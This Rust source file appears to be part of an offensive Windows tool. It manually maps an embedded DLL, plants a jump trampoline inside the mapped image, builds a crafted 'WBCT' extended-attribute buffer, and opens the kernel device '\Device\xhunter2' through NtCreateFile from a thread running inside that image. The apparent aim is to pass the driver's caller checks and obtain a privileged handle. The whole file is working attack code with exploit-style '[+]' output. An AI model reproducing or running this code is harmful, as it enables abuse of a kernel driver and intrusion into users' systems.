use std::ffi::c_void;
use std::ptr;
use std::sync::atomic::{AtomicI32, Ordering};

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
    PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject,
    INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
};

use crate::proto::Handle;

type NTSTATUS = i32;
type ULONG    = u32;
type USHORT   = u16;

#[repr(C)] struct UNICODE_STRING { Length: USHORT, MaximumLength: USHORT, Buffer: *mut u16 }
#[repr(C)] struct OBJECT_ATTRIBUTES {
    Length: ULONG, RootDirectory: Handle, ObjectName: *const UNICODE_STRING,
    Attributes: ULONG, SecurityDescriptor: *const c_void,
    SecurityQualityOfService: *const c_void,
}
#[repr(C)] struct IO_STATUS_BLOCK { Status: NTSTATUS, Information: usize }

const OBJ_CASE_INSENSITIVE: ULONG = 0x40;
const FILE_OPEN:             ULONG = 1;

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtCreateFile(
        FileHandle: *mut Handle, DesiredAccess: u32,
        ObjectAttributes: *const OBJECT_ATTRIBUTES,
        IoStatusBlock: *mut IO_STATUS_BLOCK, AllocationSize: *const i64,
        FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32,
        CreateOptions: u32, EaBuffer: *const c_void, EaLength: u32,
    ) -> NTSTATUS;
}

static OPEN_STATUS: AtomicI32 = AtomicI32::new(i32::MIN);
static mut DEVICE_HANDLE: Handle = 0;

#[repr(C)]
struct OpenArgs {
    ea_buf:   *const u8,
    ea_len:   u32,
    path_buf: *mut u16,
    path_len: u16,
}
unsafe impl Send for OpenArgs {}
unsafe impl Sync for OpenArgs {}
static mut G_OPEN: OpenArgs = OpenArgs {
    ea_buf: ptr::null(), ea_len: 0, path_buf: ptr::null_mut(), path_len: 0,
};

static WBMF_DLL: &[u8] = include_bytes!("wbmf_module.dll");

// ── PE mapping ────────────────────────────────────────────────────────────────

pub fn map_wbmf() -> Result<(*mut u8, usize), String> {
    let data = WBMF_DLL;
    if data.len() < 0x40 { return Err("embedded DLL too small".into()); }
    let lfanew = u32::from_le_bytes(data[0x3c..0x40].try_into().unwrap()) as usize;
    if lfanew + 0x60 > data.len() || &data[lfanew..lfanew+4] != b"PE\0\0" {
        return Err("embedded DLL is not a valid PE".into());
    }
    let img_base = u32::from_le_bytes(data[lfanew+52..lfanew+56].try_into().unwrap()) as u64;
    let soi      = u32::from_le_bytes(data[lfanew+80..lfanew+84].try_into().unwrap()) as usize;
    if soi == 0 || soi > 0x10_000_000 { return Err(format!("bad SizeOfImage {soi:#x}")); }

    let base = unsafe {
        let p = VirtualAlloc(Some(img_base as *const c_void), soi, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if !p.is_null() { p as *mut u8 }
        else {
            let q = VirtualAlloc(None, soi, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if q.is_null() { return Err("VirtualAlloc failed".into()); }
            q as *mut u8
        }
    };
    unsafe { ptr::copy_nonoverlapping(data.as_ptr(), base, data.len().min(soi)); }

    let wbmf_ok = unsafe {
        0x290A0 + 4 <= soi &&
        std::slice::from_raw_parts(base.add(0x290A0), 4) == b"WBMF"
    };
    if !wbmf_ok {
        unsafe { let _ = VirtualFree(base as *mut c_void, 0, MEM_RELEASE); }
        return Err("WBMF magic not found — embedded DLL corrupt".into());
    }

    Ok((base, soi))
}

pub fn install_trampoline(pe_ptr: *mut u8, offset: usize, target: u64) {
    let mut tramp = [0u8; 14];
    tramp[0] = 0xFF; tramp[1] = 0x25;
    tramp[6..14].copy_from_slice(&target.to_le_bytes());
    unsafe { ptr::copy_nonoverlapping(tramp.as_ptr(), pe_ptr.add(offset), 14); }
}

pub unsafe fn set_page_rx(base: *mut u8, size: usize) {
    let mut old = PAGE_READWRITE;
    let _ = VirtualProtect(base as *mut c_void, size, PAGE_EXECUTE_READ, &mut old);
}

pub unsafe fn set_page_rw(base: *mut u8, size: usize) {
    let mut old = PAGE_EXECUTE_READ;
    let _ = VirtualProtect(base as *mut c_void, size, PAGE_READWRITE, &mut old);
}

// ── EA / WBCT builder ─────────────────────────────────────────────────────────

const WBCT_VAL: usize = 536;
const EA_HDR:   usize = 13;
const EA_TOTAL: usize = EA_HDR + WBCT_VAL;

fn build_ea(pe_base: u64) -> Box<[u8; EA_TOTAL]> {
    let mut ea = Box::new([0u8; EA_TOTAL]);
    ea[5] = 4;
    ea[6..8].copy_from_slice(&(WBCT_VAL as u16).to_le_bytes());
    ea[8..13].copy_from_slice(b"WBCT\0");
    let w = &mut ea[EA_HDR..];
    w[0..4].copy_from_slice(b"WBCT");
    w[4..6].copy_from_slice(&(WBCT_VAL as u16).to_le_bytes());
    w[6..8].copy_from_slice(&2u16.to_le_bytes());
    w[16..24].copy_from_slice(&pe_base.to_le_bytes());
    w[24..32].copy_from_slice(&pe_base.to_le_bytes());
    ea
}

// ── Device open (runs from thread inside the PE) ──────────────────────────────

unsafe extern "system" fn open_worker(_: *mut c_void) -> u32 {
    let a = &G_OPEN;
    let us = UNICODE_STRING {
        Length: a.path_len, MaximumLength: a.path_len, Buffer: a.path_buf,
    };
    let oa = OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0, ObjectName: &us, Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: ptr::null(), SecurityQualityOfService: ptr::null(),
    };
    let mut iosb = IO_STATUS_BLOCK { Status: 0, Information: 0 };
    let mut h: Handle = 0;
    let st = NtCreateFile(
        &mut h, 0xC0100000u32, &oa, &mut iosb,
        ptr::null(), 0, 0, FILE_OPEN, 0x20,
        a.ea_buf as *const c_void, a.ea_len,
    );
    DEVICE_HANDLE = h;
    OPEN_STATUS.store(st, Ordering::SeqCst);
    0
}

pub const DEFAULT_DEVICE: &str = r"\Device\xhunter2";

/// Normalise a `--device` argument into an NT path.
/// * `\Device\xhunter2`  → passthrough
/// * `\\.\xhunter2`      → passthrough (accepted by NtCreateFile)
/// * `xhunter2`          → `\Device\xhunter2`
pub fn normalise_device(name: &str) -> String {
    if name.starts_with(r"\Device\") || name.starts_with(r"\\.\") || name.starts_with(r"\??\") {
        name.to_string()
    } else {
        format!(r"\Device\{name}")
    }
}

pub fn open_device(device: &str) -> Result<(Handle, *mut u8, usize), String> {
    let (pe_ptr, soi) = map_wbmf()?;
    let pe_base = pe_ptr as u64;

    println!("[+] wbmf_module.dll  mapped @ {pe_base:#x}  size={soi:#x}  WBMF @ {:#x}",
        pe_base + 0x290A0);

    install_trampoline(pe_ptr, 0x500, open_worker as u64);
    println!("[+] trampoline  {:#x} -> open_worker", pe_base + 0x500);

    let ea = build_ea(pe_base);
    let mut path_wide: Vec<u16> = device.encode_utf16().collect();
    unsafe {
        G_OPEN = OpenArgs {
            ea_buf:   ea.as_ptr(),
            ea_len:   ea.len() as u32,
            path_buf: path_wide.as_mut_ptr(),
            path_len: (path_wide.len() * 2) as u16,
        };
        set_page_rx(pe_ptr, soi);
    }

    let tramp: windows::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        unsafe { std::mem::transmute((pe_base + 0x500) as usize) };
    let th = unsafe {
        CreateThread(None, 0, tramp, None, THREAD_CREATE_RUN_IMMEDIATELY, None)
            .map_err(|e| format!("CreateThread(open_worker): {e}"))?
    };
    unsafe { WaitForSingleObject(th, INFINITE); let _ = CloseHandle(th); }
    unsafe { set_page_rw(pe_ptr, soi); }

    let st  = OPEN_STATUS.load(Ordering::SeqCst);
    let dev = unsafe { DEVICE_HANDLE };

    if st == 0 && dev != 0 {
        println!("[+] NtCreateFile  {device}  handle={dev:#x}  NTSTATUS {:#010x}", st as u32);
        Ok((dev, pe_ptr, soi))
    } else {
        unsafe { let _ = VirtualFree(pe_ptr as *mut c_void, 0, MEM_RELEASE); }
        Err(format!("NtCreateFile NTSTATUS {:#010x}", st as u32))
    }
}
